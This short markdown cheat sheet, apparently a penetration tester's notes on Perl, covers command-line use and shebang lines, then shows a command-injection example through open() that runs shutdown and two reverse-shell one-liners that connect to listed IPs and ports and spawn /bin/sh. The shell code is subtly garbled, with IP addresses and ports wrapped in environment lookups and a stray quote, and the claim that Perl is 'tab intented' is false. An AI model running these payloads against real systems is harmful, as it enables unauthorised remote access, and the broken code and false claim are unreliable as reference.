# Perl

Executing command line `perl` scripting requires `-e` flag for executing, without drop to a perl environment that does not save to a file:
```bash
perl -e 'your perl goes here'
perl
...
```

Perl scripts require the file extension .pl and can be executed from the command line like other script languages with its own command `perl`
```bash
perl script.pl
```

Linux Script shebang line
```bash
#!/usr/bin/perl
# Then from command line
./script.pl
```

```perl

	# Perl is tab intented

```

 Perl command injection
```perl
# function is vulnerable and can be used to execute commands
open() 
# For example
open(“| shutdown -r |”)
```

Perl Reverse Shell 
```perl
# perl -e 'use Socket;$i="$ENV{10.10.14.52}";$p=$ENV{8000};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

use Socket;$i="$ENV{10.10.10.10}";$p=$ENV{1337};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
## References

[haax.fr perl](https://cheatsheet.haax.fr/linux-systems/programing-languages/perl/)
[apache - Perl Code Style Guides](https://cwiki.apache.org/confluence/display/VCL/Perl+Code+Style+Guidelines)